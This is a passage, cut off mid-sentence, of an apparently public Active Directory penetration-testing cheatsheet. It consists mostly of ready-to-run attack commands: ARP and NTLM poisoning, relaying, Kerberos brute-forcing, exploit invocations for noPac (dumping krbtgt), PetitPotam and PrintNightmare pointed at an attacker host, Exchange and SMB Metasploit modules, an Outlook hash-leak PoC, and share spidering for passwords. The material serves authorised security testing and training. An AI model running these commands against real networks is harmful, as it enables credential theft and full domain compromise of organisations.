description = "This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs,..."
full_description = '''Active Directory - Python edition This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter @BlWasp_. I will try to put as many links as possible at the end of the page to direct to more complete resources. Misc Internal audit mindmap Insane mindmap by @M4yFly. Find the domain and the DCs Generally the domain name can be found in /etc/resolv.conf Then the DNS is generally installed on the DC : nslookup domain.local Usernames wordlist Create a wordlist of usernames from list of Surname Name Code here python3 namemash.py users.txt > usernames.txt Initial Access What to do when you are plugged on the network without creds. NTLM authentication capture on the wire with Responder poisoning, maybe in NTLMv1 ? Relay the NTLM authentications to interesting endpoints, be careful to the signing SMB socks to list/read/write the shares LDAP to dump the directory LDAPS (or maybe SMB if signing not required) to add a computer account ... ARP poisoning with bettercap, can be used to poison ARP tables of targets and receive authenticated requests normally destinated to other devices. Interesting scenarios can be found here. By sniffing everything on the wire with Wireshark, some secrets can be found with PCredz. First, run bettercap with this config file: # quick recon of the network net.probe on # set the ARP poisoning set arp.spoof.targets <target_IP> set arp.spoof.internal true set arp.spoof.fullduplex true # control logging and verbosity events.ignore endpoint events.ignore net.sniff.mdns # start the modules arp.spoof on net.sniff on sudo ./bettercap --iface <interface> --caplet spoof.cap Then sniff with Wireshark. When it is finish, save the trace in a .pcap file and extract the secrets: python3 ./Pcredz -f extract.pcap Poison the DHCPv6 answer to receive NTLM or Kerberos authentication NTLM auths can be relayed with ntlmrelayx Kerberos auths can be relayed with krbrelayx to HTTP endpoints (ADCS, SCCM AdminService API) Search for a domain account Look for SMB Guest and null session, and LDAP null bind # SMB Guest authentication nxc smb <targets> -u 'Guest' -p '' --shares # SMB Null/Anonymous session nxc smb <DC_IP> --users # LDAP null bind nxc ldap <DC_IP> -u '' -p '' --users Perform RID cycling through SMB null session nxc smb <target> -u '' -p '' --rid-brute 10000 Perform bruteforce attacks With SMB login bruteforce With Kerbrute bruteforce Allows you to bruteforce Kerberos on user accounts while indicating whether the user account exists or not. Another advantage over smb_login is that it doesn't correspond to the same EventId, thus bypassing potential alerts. The script can work with 2 independent lists for users and passwords, but be careful not to block accounts! ./kerbrute userenum -domain domain.local users.txt Test for the Top1000 with login = password Possible other passwords: (empty) password P@ssw0rd Look for juicy CVEs Search for devices like printers, routers, or similar stuff with default creds In case a printer (or something similar) has an LDAP account, but use the SASL authentication family instead of SIMPLE, the classic LDAP passback exploitation with a nc server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak PLAIN and LOGIN protocols. This Docker permits to operate with weak protocols. docker buildx build -t ldap-passback . docker run --rm -ti -p 389:389 ldap-passback In parallel, listen with tshark: tshark -i any -f "port 389" \ -Y "ldap.protocolOp == 0 && ldap.simple" \ -e ldap.name -e ldap.simple -Tjson CVEs AD oriented SPNEGO RCE (CVE-2022-37958) - No public POC for the moment PetitPotam pre-auth (CVE-2022-26925) If the target is not patched, this CVE can be exploited without creds. ./petitpotam.py -pipe all <attacker_IP> <target_IP> NoPac (a.k.a. SamAccountName Spoofing, CVE-2021-42278 and CVE-2021-42287) To exploit these vulnerabilities you need to already control a computer account or have the right to create a new one. #Get ST python3 noPac.py domain.local/user1:'password' -dc-ip <DC_IP> #Auto dump the hash python3 noPac.py domain.local/user1:'password' -dc-ip <DC_IP> --impersonate administrator -dump -just-dc-user domain/krbtgt PrintNightmare (CVE-2021-1675 / CVE-2021-34527) #Load a DLL hosted on a SMB server on the attacker machine ./printnightmare.py -dll '\\<attacker_IP>\smb\add_user.dll' 'user1:password@<target_IP>' #Load a DLL hosted on the target, and specify a custom driver name ./printnightmare.py -dll 'C:\Windows\System32\spool\drivers\x64\3\old\1\add_user.dll' -name 'Patapouf' 'user1:password@<target_IP>' Zerologon (CVE-2020-1472) The relay technique is preferable to the other one which is more risky and potentially destructive. See in the link. EternalBlue / Blue Keep (MS17-010 / CVE-2019-0708) The exploits in the Metasploit framework are good for these two CVEs. #EternalBlue msf6 exploit(windows/smb/ms17_010_psexec) > #Blue Keep msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > SMBGhost (CVE-2020-0796) Be careful, this exploit is pretty unstable and the risk of BSOD is really important. The exploit in the Metasploit framework is good for this CVE. msf6 exploit(windows/smb/cve_2020_0796_smbghost) > RC4-MD4 downgrade (CVE-2022-33679) To exploit this CVE the RC4-MD4 encryption must be enabled on the KDC, and an AS-REP Roastable account is needed to obtain an ST for the target. ./CVE-2022-33079.py -dc-ip <DC_IP> domain.local/<as-rep_roastable_user> <target_NETBIOS> Credentials Roaming (CVE-2022-30170) # Fetch current user object $user = get-aduser <victim username> -properties @('msPKIDPAPIMasterKeys','msPKIAccountCredentials', 'msPKI-CredentialRoamingTokens','msPKIRoamingTimestamp') # Install malicious Roaming Token (spawns calc.exe) $malicious_hex = "" $attribute_string = "B:$($malicious_hex.Length):${malicious_hex}:$($user.DistinguishedName)" Set-ADUser -Identity $user -Add @{msPKIAccountCredentials=$attribute_string} -Verbose # Set new msPKIRoamingTimestamp so the victim machine knows an update was pushed $new_msPKIRoamingTimestamp = ($user.msPKIRoamingTimestamp[8..15] + [System.BitConverter]::GetBytes([datetime]::UtcNow.ToFileTime())) -as [byte[]] Set-ADUser -Identity $user -Replace @{msPKIRoamingTimestamp=$new_msPKIRoamingTimestamp} -Verbose Bronze Bit (CVE-2020-17049) To exploit this CVE, a controlled service account with constrained delegation to the target account is needed. getST.py -force-forwardable -spn <cifs/target.domain.local> -impersonate Administrator -dc-ip <DC_IP> -hashes :<service_account_hash> domain.local/<service_account> MS14-068 goldenPac.py 'domain.local'/'user1':'password'@<DC_IP> Targeting Exchange server ProxyNotShell / ProxyShell / ProxyLogon (CVE-2022-41040 & CVE-2022-41082 / CVE-2021-34473 & CVE-2021-34523 & CVE-2021-31207 / CVE-2021-26855 & CVE-2021-27065) The exploits in the Metasploit framework are good for these three CVEs. msf6 exploit(windows/http/exchange_proxynotshell_rce) > msf6 exploit(windows/http/exchange_proxyshell_rce) > msf6 exploit(windows/http/exchange_proxylogon_rce) > CVE-2023-23397 This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a .msg file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target. python3 CVE-2023-23397.py --path '\\<attacker_IP>\' Before sending the email, run Responder to intercept the NTLM hash. For local privesc Look at the Active Directory cheatsheet for this part. Domain Enumeration Domain policy Current domain #Domain policy with ldeep ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> domain_policy #Password policy with NXC nxc smb <targets> -u user1 -p password --pass-pol Another domain ldeep ldap -u user1 -p password -d domain.local -s <remote_LDAP_server_IP> domain_policy Domain controller The DNS is generally on the DC. nslookup domain.local nxc smb <DC_IP> -u user1 -p password Users enumeration List users ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users User's properties ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users -v nxc ldap <DC_IP> -u user1 -p password -M get-unixUserPassword -M getUserPassword Search for a particular string in attributes ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users -v |grep -i password Actively logged users on a machine Needs local admin rights on the target nxc smb <target> -u user1 -p password --sessions User hunting Find machine where the user has admin privs If a Pwned connection appears, admin rights are present. However, if the UAC is present it can block the detection. nxc smb <targets_file> -u user1 -p password Find local admins on a domain machine lookupadmins.py python3 lookupadmins.py domain.local/user1:password@<target_IP> #NXC nxc smb <targets> -u user1 -p password --local-groups Administrators Computers enumeration ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines #Full info ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines -v #Hostname enumeration ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> computers ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> computers --resolve Groups enumeration Groups in the current domain ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups #Full info ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups -v Search for a particular string in attributes ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups -v |grep -i admin All users in a specific group ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> membersof <group> -v All groups of an user ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> memberships <user_account> Local groups enumeration nxc smb <target> -u user1 -p password --local-groups Members of a local group nxc smb <target> -u user1 -p password --local-groups <group> Shares / Files Find shares on the domain nxc smb <targets> -u user1 -p password --shares A module for searching network shares:spider_plus. Running the module without any options (on a /24, for example) will produce a JSON output for each server, containing a list of all files (and some info), but without their contents. Then grep on extensions (conf, ini...) or names (password .. ) to identify an interesting file to search: nxc smb <targets> -u user1 -p password -M spider_plus Then, when identifying a lot of interesting files, to speed up the search, dump this on the attacker machine by adding the -o READ_ONLY=False option after the -M spider_plus (but avoid /24, otherwise it'll take a long time). In this case, NetExec will create a folder with the machine's IP, and all the folders/files in it. nxc smb <targets> -u user1 -p password -M spider_plus -o READ_ONLY=False Manspider can also be used for this purpose. It permits to crawl all the shares or specific ones, and filter on file extensions, file names, and file contents. # Filter on file names manspider <targets> -f passw user admin account network login logon cred -d domain -u user1 -p password # Search for content manspider <targets> -c passw cpassword -d domain -u user1 -p password # Search for file extension manspider <targets> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d domain -u user1 -p password Parameters can be combined. Find files with a specific pattern nxc smb <targets> -u user1 -p password --spider <share_name> --content --pattern pass Find files with sensitive data Python version of Snaffler pysnaffler 'smb2+ntlm-password://domain\user1:password@<target>' <target> GPO enumeration List of GPO in the domain ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> gpo Organisation Units OUs of the domain and their linked GPOs ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> ou Computers within an OU ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines -v |grep -i "OU=<OU_name>" |grep -i "distinguishedName" DACLs All ACLs associated to an object (inbound) #With samAccountName dacledit.py -action read -target <target_samAccountName> -dc-ip <DC_IP> domain.local/user1:password #With DN dacledit.py -action read -target-dn <target_DN> -dc-ip <DC_IP> domain.local/user1:password #With SID dacledit.py -action read -target-sid <target_SID> -dc-ip <DC_IP> domain.local/user1:password Outbound ACLs of an object These are the rights a principal has against another object dacledit.py -action read -target <target_samAccountName> -principal <principal_samAccountName> <-dc-ip <DC_IP> domain.local/user1:password Trusts Trusts for the current domain ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> trusts BloodHound The Bloodhound-python module doesn't support all the SharpHound features (essentially about GPOs) DNS resolution Sometimes the DNS resolution to find the DC doesn't work very well. dnschef can solve this problem: dnschef --fakeip <DC_IP> --fakedomains domain.local -q Then, in the BloodHound command specify the DNS address with -ns 127.0.0.1, dnschef will do the work. Basic usage # Default collection bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local --zip # All collection excepted LoggedOn bloodhound-python -u user1 -p password -d domain.local -c all -dc DC.domain.local --zip #With LoggedOn bloodhound-python -u user1 -p password -d domain.local -c all,LoggedOn -dc DC.domain.local --zip #Only collect from the DC, doesn't query the computers (more stealthy) bloodhound-python -u user1 -p password -d domain.local -c DCOnly -dc DC.domain.local --zip Specify another Global Catalog bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local -gc <hostname> --zip Interesting Neo4j queries Users with SPNs MATCH (u:User {hasspn:true}) RETURN u AS-REP Roastable users MATCH (u:User {dontrepreauth:true}) RETURN u Computers AllowedToDelegate to other computers MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) return p Shortest path from Kerberoastable user MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p Computers in Unconstrained Delegations MATCH (c:Computer {unconsraineddelegation:true}) RETURN c Rights against'''
